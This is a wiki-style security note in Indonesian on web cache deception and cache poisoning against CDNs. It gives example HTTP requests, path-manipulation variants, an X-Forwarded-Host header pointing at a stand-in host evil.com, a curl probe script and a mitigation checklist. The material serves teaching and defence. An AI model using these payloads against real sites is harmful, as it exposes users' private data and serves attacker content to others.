---
title: "Web Cache Deception & Web Cache Poisoning — CDN Cache Manipulation, Exploit, Defense"
tags:
  - cyber-security
  - cache
  - web-security
  - cdn
  - cloudflare
  - library
aliases:
  - "Web Cache Deception Guide"
  - "Cache Poisoning Attack"
created: "2026-07-28"
updated: "2026-08-14"
status: complete
cssclasses:
  - wide-table
---

> [!info] Ringkasan
> Web Cache Deception mengecoh cache (CDN/load balancer) agar menyimpan halaman yang berisi **sensitive information**. Attacker memanfaatkan perbedaan cara server dan cache menentukan apakah request mengarah ke static file. Web Cache Poisoning mencemari cache dengan response jahat sehingga user lain menerima konten attacker.
>
> **Cross-link:** [[cloudflare-ruleset-engine-phases]] → [[web-security]] → [[api-security-deep-dive]]

## 1. Ringkasan Eksekutif
Cache Deception dan Cache Poisoning menargetkan **integritas cache** yang dianggap *trusted* oleh infrastruktur CDN. Dengan menambahkan ekstensi atau manipulasi header, attacker dapat memaksa CDN men-cache respons dinamis yang berisi data rahasia (mis. JSON API, profil user). Cache Poisoning selanjutnya menyuntikkan konten jahat (malware, phishing) yang disajikan ke semua pengguna, mengakibatkan *mass impact*.

## 2. Threat Model / Konteks
| Skenario | Vektor | Dampak |
|----------|--------|--------|
| Cache Deception | URL dengan ekstensi static (`.css`, `.js`) pada endpoint dinamis | Kebocoran PII, credential, data sensitif via CDN cache HIT |
| Cache Poisoning (Unkeyed) | Header manipulasi (`X-Forwarded-Host`, `Host`) atau query param yang tidak dipakai sebagai cache key | Penyuntikan malware, phishing, session hijack untuk semua user |
| CDN Misconfiguration | `Cache-Control: public` pada endpoint auth | Ekspos token, session cookie, credential |

## 3. Langkah-Langkah Teknik Detail
### 3.1 Cache Deception Exploitation
#### Teknik Dasar
```http
# Request ini dianggap static file oleh CDN karena ekstensi .css
# Tapi server (Django/Rails) mengabaikan ekstensi dan return sensitive page
GET /account/profile/settings.css HTTP/1.1
Host: target.com

# Jika cache menyimpan response → bisa diakses siapa saja
GET /account/profile/settings.css
# → Return sensitive page dari cache!
```
#### Variasi Extension
- `/account/profile/.css`
- `/account/profile/test.css`
- `/account/profile/settings.js`
- `/account/profile/avatar.jpg`
- `/account/profile/data.xml`
#### Path Manipulation
- `/account/profile/..;/settings.css`
- `/account/profile%00.css`
- `/account/profile%23.css`  (fragment)

### 3.2 Cache Poisoning — Unkeyed Headers
#### X-Forwarded-Host / X-Host
```http
GET /api/users HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Jika backend menggunakan XFH untuk generate redirect/template URL
# Cache menyimpan response dengan URL dari evil.com
# User lain → redirect ke evil.com
```
#### Unkeyed Query Parameters
```http
# Cache hanya key: path + host
# Tidak key: random parameter
GET /api/profile?random=123
# Response: {"user": "admin", "credit_card": "4111..."}
# Di-cache karena WAF/CDN mengira static
GET /api/profile?random=456
# Mendapat response dari cache milik user lain
```

## 4. Deteksi & Tools
| Tool | Fungsi |
|------|--------|
| **ffuf** | Fuzz parameter & payload traversal untuk menemukan endpoint yang cacheable |
| **Burp Intruder** + payload list | Brute force encoding variants & extensions |
| **Nuclei** (template `path-traversal`) | Scanning massal pada banyak domain |
| **cURL** + `-I` header inspection | Cek header `Age`, `CF-Cache-Status`, `X-Cache` |
| **CacheCheck** (custom script) | Verifikasi apakah response di-cache dengan `curl -I` dan bandingkan `ETag`/`Last-Modified` |

### Contoh Script Deteksi
```bash
#!/usr/bin/env bash
url=$1
# Test static extension
curl -I "$url.css" | grep -i "CF-Cache-Status"
# Test unkeyed header
curl -I -H "X-Forwarded-Host: evil.com" "$url" | grep -i "Age"
```

## 5. Checklist Mitigasi
- [ ] **Cache-Control**: `no-store, private` untuk semua endpoint dinamis (API, profile) 
- [ ] **Validasi ekstensi**: Pastikan server menolak request dengan ekstensi static pada endpoint dinamis
- [ ] **Header normalization**: CDN harus menggunakan **both** `Host` **and** `X-Forwarded-Host` sebagai cache key, atau hapus header sebelum caching
- [ ] **Vary header**: Set `Vary: X-Forwarded-Host, X-Forwarded-Proto, Accept-Language`
- [ ] **WAF rules**: Block pattern `(\.|/){2,}` pada path, dan *double‑encoding* (`%2e%2e%2f`)
- [ ] **Rate limiting** pada endpoint yang menghasilkan response unik per user
- [ ] **Logging & monitoring**: Deteksi anomali `CF-Cache-Status: HIT` pada route yang seharusnya `MISS`
- [ ] **Security review**: Pastikan tidak ada *private data* pada response yang memiliki `Cache-Control: public`

## 6. Referensi Lintas
- [[cloudflare-ruleset-engine-phases]]
- [[web-security]]
- [[api-security-deep-dive]]
- [[incident-response-framework]]
- [[threat-modeling-stride-dread]]

---

### 📚 Referensi
1. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Deception/
2. Cloudflare Docs: Cache Keys & Vary (https://developers.cloudflare.com/cache/concepts/cache-keys/)
3. OWASP Cache Poisoning Cheat Sheet
4. "Cache Deception: Bypassing HTTP Caches with Dynamic Content" — Black Hat 2022
---

audited
---
